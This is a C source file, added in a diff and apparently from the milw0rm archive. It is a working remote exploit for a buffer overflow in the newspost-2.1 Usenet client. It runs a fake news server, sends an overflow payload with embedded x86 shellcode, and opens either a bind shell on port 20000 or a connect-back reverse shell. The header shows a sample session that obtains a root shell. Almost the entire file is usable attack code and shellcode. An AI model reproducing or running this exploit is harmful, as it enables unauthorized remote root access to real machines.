@@ -1,0 +1,405 @@
+/*
+ * v0.2
+ * Newspost "socket_getline()" Buffer Overflow Exploit
+ * Exploit
+ * Bug discovered: 02/03/2005
+ *
+ * cybertronic[at]gmx[dot]net
+ *
+ * [ cybertronic @ newspost ] $ gcc -o newspost_expl newspost_expl.c
+ * [ cybertronic @ newspost ] $ ./newspost_expl cyber tronic
+ * Usage
+ * -----
+ * [ Bindshell    ] ./newspost_expl
+ * [ Reverseshell ] ./newspost_expl [CONNECTBACK IP]
+ * [ cybertronic @ newspost ] $ ./newspost_expl
+ *
+ *               __              __                   _
+ *   _______  __/ /_  ___  _____/ /__________  ____  (_)____
+ *  / ___/ / / / __ \/ _ \/ ___/ __/ ___/ __ \/ __ \/ / ___/
+ * / /__/ /_/ / /_/ /  __/ /  / /_/ /  / /_/ / / / / / /__
+ * \___/\__, /_.___/\___/_/   \__/_/   \____/_/ /_/_/\___/
+ *     /____/
+ *
+ * --[ exploit by : cybertronic - cybertronic[at]gmx[dot]net
+ * --[ newspost-2.1 remote exploit
+ * --[ enter retaddr [ 0 = default ]
+ * >> 0
+ * --[ listening...OK!
+ * --[ Incomming connection from:   192.168.2.103
+ * --[ using bind shellcode!
+ * --[ retaddr: 0xbfffee01
+ * --[ sending packet [ 1056 bytes ]...done!
+ * --[ sleeping 5 seconds before connecting to 192.168.2.103:20000...
+ * --[ connecting to 192.168.2.103:20000...done!
+ * --[ b0x pwned - h4ve phun
+ * id
+ * uid=0(root) gid=0(root) groups=0(root)
+ *
+ */
+
+#include <stdio.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <netdb.h>
+
+#define RED		"\E[31m\E[1m"
+#define GREEN	"\E[32m\E[1m"
+#define YELLOW	"\E[33m\E[1m"
+#define BLUE	"\E[34m\E[1m"
+#define NORMAL	"\E[m"
+
+#define PORT	119
+
+int isip ( char *ip );
+int shell ( int s, char* tip, unsigned short cbport );
+
+void connect_to_bindshell ( char* tip, unsigned short bport );
+void exploit ( int s, char* ip, unsigned long lip, unsigned long ret, int option );
+void header ();
+void start_reverse_handler ( unsigned short cbport );
+void wait ( int sec );
+
+//131 bytes connect back 45295, greetz to esDee
+char linux_connect_back[] =
+"\x31\xc0\x31\xdb\x31\xc9\x51\xb1"
+"\x06\x51\xb1\x01\x51\xb1\x02\x51"
+"\x89\xe1\xb3\x01\xb0\x66\xcd\x80"
+"\x89\xc2\x31\xc0\x31\xc9\x51\x51"
+"\x68\x41\x42\x43\x44\x66\x68\xb0"
+"\xef\xb1\x02\x66\x51\x89\xe7\xb3"
+"\x10\x53\x57\x52\x89\xe1\xb3\x03"
+"\xb0\x66\xcd\x80\x31\xc9\x39\xc1"
+"\x74\x06\x31\xc0\xb0\x01\xcd\x80"
+"\x31\xc0\xb0\x3f\x89\xd3\xcd\x80"
+"\x31\xc0\xb0\x3f\x89\xd3\xb1\x01"
+"\xcd\x80\x31\xc0\xb0\x3f\x89\xd3"
+"\xb1\x02\xcd\x80\x31\xc0\x31\xd2"
+"\x50\x68\x6e\x2f\x73\x68\x68\x2f"
+"\x2f\x62\x69\x89\xe3\x50\x53\x89"
+"\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0"
+"\x01\xcd\x80";
+
+//92 bytes bindcode port 20000
+char scode[] =
+"\x31\xdb"				// xor ebx, ebx
+"\xf7\xe3"				// mul ebx
+"\xb0\x66"				// mov al, 102
+"\x53"					// push ebx
+"\x43"					// inc ebx
+"\x53"					// push ebx
+"\x43"					// inc ebx
+"\x53"					// push ebx
+"\x89\xe1"				// mov ecx, esp
+"\x4b"					// dec ebx
+"\xcd\x80"				// int 80h
+"\x89\xc7"				// mov edi, eax
+"\x52"					// push edx
+"\x66\x68\x4e\x20"		// push word 8270
+"\x43"					// inc ebx
+"\x66\x53"				// push bx
+"\x89\xe1"				// mov ecx, esp
+"\xb0\xef"				// mov al, 239
+"\xf6\xd0"				// not al
+"\x50"					// push eax
+"\x51"					// push ecx
+"\x57"					// push edi
+"\x89\xe1"				// mov ecx, esp
+"\xb0\x66"				// mov al, 102
+"\xcd\x80"				// int 80h
+"\xb0\x66"				// mov al, 102
+"\x43"					// inc ebx
+"\x43"					// inc ebx
+"\xcd\x80"				// int 80h
+"\x50"					// push eax
+"\x50"					// push eax
+"\x57"					// push edi
+"\x89\xe1"				// mov ecx, esp
+"\x43"					// inc ebx
+"\xb0\x66"				// mov al, 102
+"\xcd\x80"				// int 80h
+"\x89\xd9"				// mov ecx, ebx
+"\x89\xc3"				// mov ebx, eax
+"\xb0\x3f"				// mov al, 63
+"\x49"					// dec ecx
+"\xcd\x80"				// int 80h
+"\x41"					// inc ecx
+"\xe2\xf8"				// loop lp
+"\x51"					// push ecx
+"\x68\x6e\x2f\x73\x68"	// push dword 68732f6eh
+"\x68\x2f\x2f\x62\x69"	// push dword 69622f2fh
+"\x89\xe3"				// mov ebx, esp
+"\x51"					// push ecx
+"\x53"					// push ebx
+"\x89\xe1"				// mov ecx, esp
+"\xb0\xf4"				// mov al, 244
+"\xf6\xd0"				// not al
+"\xcd\x80";				// int 80h
+
+int
+isip ( char *ip )
+{
+	int a, b, c, d;
+	
+	if ( !sscanf ( ip, "%d.%d.%d.%d", &a, &b, &c, &d ) )
+		return ( 0 );
+	if ( a < 1 )
+		return ( 0 );
+	if ( a > 255 )
+		return 0;
+	if ( b < 0 )
+		return 0;
+	if ( b > 255 )
+		return 0;
+	if ( c < 0 )
+		return 0;
+	if ( c > 255 )
+		return 0;
+	if ( d < 0 )
+		return 0;
+	if ( d > 255 )
+		return 0;
+	return 1;
+}
+
+int
+shell ( int s, char* tip, unsigned short cbport )
+{
+	int n;
+	char buffer[2048];
+	fd_set fd_read;
+
+	printf ( "--[" YELLOW " b" NORMAL "0" YELLOW "x " NORMAL "p" YELLOW "w" NORMAL "n" YELLOW "e" NORMAL "d " YELLOW "- " NORMAL "h" YELLOW "4" NORMAL "v" YELLOW "e " NORMAL "p" YELLOW "h" NORMAL "u" YELLOW "n" NORMAL "\n" );
+
+	FD_ZERO ( &fd_read );
+	FD_SET ( s, &fd_read );
+	FD_SET ( 0, &fd_read );
+
+	while ( 1 )
+	{
+		FD_SET ( s, &fd_read );
+		FD_SET ( 0, &fd_read );
+
+		if ( select ( s + 1, &fd_read, NULL, NULL, NULL ) < 0 )
+			break;
+		if ( FD_ISSET ( s, &fd_read ) )
+		{
+			if ( ( n = recv ( s, buffer, sizeof ( buffer ), 0 ) ) < 0 )
+			{
+				printf ( "bye bye...\n" );
+				return;
+			}
+			if ( write ( 1, buffer, n ) < 0 )
+			{
+				printf ( "bye bye...\n" );
+				return;
+			}
+		}
+		if ( FD_ISSET ( 0, &fd_read ) )
+		{
+			if ( ( n = read ( 0, buffer, sizeof ( buffer ) ) ) < 0 )
+			{
+				printf ( "bye bye...\n" );
+				return;
+			}
+			if ( send ( s, buffer, n, 0 ) < 0 )
+			{
+				printf ( "bye bye...\n" );
+				return;
+			}
+		}
+		usleep(10);
+	}
+}
+
+void
+connect_to_bindshell ( char* tip, unsigned short bport )
+{
+	int s;
+	int sec = 5; // change this for fast targets
+	struct sockaddr_in remote_addr;
+	struct hostent *host_addr;
+
+	if ( ( host_addr = gethostbyname ( tip ) ) == NULL )
+	{
+		fprintf ( stderr, "cannot resolve \"%s\"\n", tip );
+		exit ( 1 );
+	}
+
+	remote_addr.sin_family = AF_INET;
+	remote_addr.sin_addr   = * ( ( struct in_addr * ) host_addr->h_addr );
+	remote_addr.sin_port   = htons ( bport );
+
+	if ( ( s = socket ( AF_INET, SOCK_STREAM, 0 ) ) < 0 )
+    {
+		printf ( "socket failed!\n" );
+		exit ( 1 );
+	}
+	printf ( "--[ sleeping %d seconds before connecting to %s:%u...\n", sec, tip, bport );
+	wait ( sec );
+	printf ( "--[ connecting to %s:%u...", tip, bport );
+	if ( connect ( s, ( struct sockaddr * ) &remote_addr, sizeof ( struct sockaddr ) ) ==  -1 )
+	{
+		printf ( RED "failed!\n" NORMAL);
+		exit ( 1 );
+	}
+	printf ( YELLOW "done!\n" NORMAL);
+	shell ( s, tip, bport );
+}
+
+void
+exploit ( int s, char* ip, unsigned long lip, unsigned long ret, int option )
+{
+	char out[1200];
+
+	bzero ( &out, 1200 );
+	memset ( out, 0x90, 1052 );
+	printf ( "--[ retaddr: 0x%08x\n", ret );
+	strncat ( out, ( unsigned char* ) &ret, 4 );
+
+	if ( option == 0 )
+	{
+		memcpy ( &linux_connect_back[33], &lip, 4);
+		memcpy ( out + 649, linux_connect_back, sizeof ( linux_connect_back ) - 1 );
+	}
+	else
+		memcpy ( out + 649, scode, sizeof ( scode ) - 1 );
+
+	printf ( "--[ sending packet [ %u bytes ]...", strlen ( out ) );
+	if ( write ( s, out, strlen ( out ) ) <= 0 )
+	{
+		printf ( RED "FAILED!\n" NORMAL);
+		exit ( 1 );
+	}
+	printf ( YELLOW "done!\n" NORMAL);
+	close ( s );
+}
+
+void
+header ()
+{
+	printf ( "              __              __                   _           \n" );
+	printf ( "  _______  __/ /_  ___  _____/ /__________  ____  (_)____      \n" );
+	printf ( " / ___/ / / / __ \\/ _ \\/ ___/ __/ ___/ __ \\/ __ \\/ / ___/  \n" );
+	printf ( "/ /__/ /_/ / /_/ /  __/ /  / /_/ /  / /_/ / / / / / /__        \n" );
+	printf ( "\\___/\\__, /_.___/\\___/_/   \\__/_/   \\____/_/ /_/_/\\___/  \n" );
+	printf ( "    /____/                                                     \n\n" );
+	printf ( "--[ exploit by : cybertronic - cybertronic[at]gmx[dot]net\n" );
+}
+
+void
+start_reverse_handler ( unsigned short cbport )
+{
+	int s1, s2;
+	struct sockaddr_in cliaddr, servaddr;
+	socklen_t clilen = sizeof ( cliaddr );
+
+	bzero ( &servaddr, sizeof ( servaddr ) );
+	servaddr.sin_family = AF_INET;
+	servaddr.sin_addr.s_addr = htonl ( INADDR_ANY );
+	servaddr.sin_port = htons ( cbport );
+
+	printf ( "--[ starting reverse handler [port: %u]...", cbport );
+	if ( ( s1 = socket ( AF_INET, SOCK_STREAM, 0 ) ) == -1 )
+	{
+		printf ( "socket failed!\n" );
+		exit ( 1 );
+	}
+	bind ( s1, ( struct sockaddr * ) &servaddr, sizeof ( servaddr ) );
+	if ( listen ( s1, 1 ) == -1 )
+	{
+		printf ( "listen failed!\n" );
+		exit ( 1 );
+	}
+	printf ( YELLOW "done!\n" NORMAL);
+	if ( ( s2 = accept ( s1, ( struct sockaddr * ) &cliaddr, &clilen ) ) < 0 )
+	{
+		printf ( "accept failed!\n" );
+		exit ( 1 );
+	}
+	close ( s1 );
+	printf ( "--[ incomming connection from:\t" YELLOW " %s\n" NORMAL, inet_ntoa ( cliaddr.sin_addr ) );
+	shell ( s2, ( char* ) inet_ntoa ( cliaddr.sin_addr ), cbport );
+	close ( s2 );
+}
+
+void
+wait ( int sec )
+{
+	sleep ( sec );
+}
+
+int
+main ( int argc, char* argv[] )
+{
+	int s1, s2;
+	unsigned long lip;
+	unsigned long ret = 0;
+	char* ip;
+	pid_t childpid;
+	socklen_t clilen;
+	struct sockaddr_in cliaddr, servaddr;
+	
+	if ( argc != 1 )
+		if ( argc != 2 )
+		{
+			fprintf ( stderr, "Usage\n-----\n[ Bindshell    ] %s\n[ Reverseshell ] %s [CONNECTBACK IP]\n", argv[0], argv[0] );
+			exit ( 1 );
+		}
+	system ( "clear" );
+	header ();
+	if ( argc == 2 )
+	{
+		if ( !isip ( argv[1] ) )
+		{
+			printf ( "--[ Invalid connectback IP!\n" );
+			exit ( 1 );
+		}
+	}
+
+	if ( ( s1 = socket ( AF_INET, SOCK_STREAM, 0 ) ) == -1 )
+		exit ( 1 );
+	
+	bzero ( &servaddr, sizeof ( servaddr ) );
+	servaddr.sin_family = AF_INET;
+	servaddr.sin_addr.s_addr = htonl ( INADDR_ANY );
+	servaddr.sin_port = htons ( PORT );
+	
+	bind ( s1, ( struct sockaddr * ) &servaddr, sizeof ( servaddr ) );
+	printf ( "--[ newspost-2.1 remote exploit\n" );
+	printf ( "--[ enter retaddr [ 0 = default ]\n" );
+	printf ( ">> " );
+	scanf ( "%x", &ret );
+	if ( ret == 0 )
+		ret = 0xbfffee01;
+	printf ( "--[ listening..." );
+	if ( listen ( s1, 1 ) == -1 )
+	{
+		printf ( RED "FAILED!\n" NORMAL );
+		exit ( 1 );
+	}
+	printf ( GREEN "OK!\n" NORMAL );
+	
+	clilen = sizeof ( cliaddr );
+		
+	if ( ( s2 = accept ( s1, ( struct sockaddr * ) &cliaddr, &clilen ) ) < 0 )
+			exit ( 1 );
+	close ( s1 );
+	printf ( "--[" GREEN " Incomming connection from:\t %s\n" NORMAL, inet_ntoa ( cliaddr.sin_addr ) );
+	if ( argc == 2 )
+	{
+		printf ( "--[" YELLOW " using connect back shellcode!\n" NORMAL );
+		lip = inet_addr ( argv[1] );
+		exploit ( s2, ( char* ) NULL, lip, ret, 0 );
+		start_reverse_handler ( 45295 );
+	}
+	else
+	{
+		printf ( "--[" YELLOW " using bind shellcode!\n" NORMAL );
+		ip = ( char* ) inet_ntoa ( cliaddr.sin_addr );
+		exploit ( s2, ip, ( unsigned long ) NULL, ret, 1 );
+		connect_to_bindshell ( ip, 20000 );
+	}
+}
+
+// milw0rm.com [2005-02-03]
